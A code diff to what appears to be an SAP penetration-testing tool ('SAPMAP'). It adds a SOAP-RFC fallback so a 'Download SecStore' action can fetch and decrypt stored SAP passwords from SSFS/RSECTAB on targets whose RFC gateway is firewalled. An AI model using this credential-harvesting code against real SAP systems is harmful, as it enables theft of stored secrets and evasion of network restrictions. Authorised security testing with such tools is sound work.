@@ -10277,9 +10277,41 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
         def _run():
             creds = node.best_credentials()
+            # Phase 3b: resolve a SOAP-RFC route + gateway-reachability
+            # probe so the SSFS/RSECTAB reads route over HTTP on
+            # firewalled targets.  Without this, the right-click
+            # "Download SecStore" action on an HTTP-only target burns
+            # ~7-10 minutes hammering 3340 (step 1 ABAP + step 1b SXPG
+            # + step 2 ABAP + alt-client search) before giving up.
+            soap_session = None
+            soap_route = None
+            try:
+                route = find_soap_rfc_route_for_node(api.state, node)
+                if route and not (
+                        sapmap_exploit._gateway_port_reachable(node)):
+                    soap_route = route
+                    from sap_soap_basic import SOAPRFCSession
+                    soap_session = SOAPRFCSession(
+                        host=route["host"], port=route["port"],
+                        client=route["client"],
+                        user=route["user"],
+                        password=route["password"],
+                        https=route["https"],
+                        timeout=180.0,
+                    )
+                    print(f"[*] SecStore {sid}: gateway down — "
+                          f"routing via SOAP-RFC "
+                          f"({route['host']}:{route['port']}, via "
+                          f"{route['via_destination']})")
+            except Exception as e:
+                logger.debug(
+                    f"SecStore SOAP route check failed: {e}")
+
             try:
                 results = sapmap_secstore.download_and_decrypt(
-                    node, creds, key_hex, state=api.state)
+                    node, creds, key_hex, state=api.state,
+                    soap_session=soap_session,
+                    soap_route=soap_route)
                 sapmap_secstore.integrate_results(node, api.state, results)
                 ok  = [r for r in results if not r.get("error") and r.get("password")]
                 err = [r for r in results if r.get("error")]
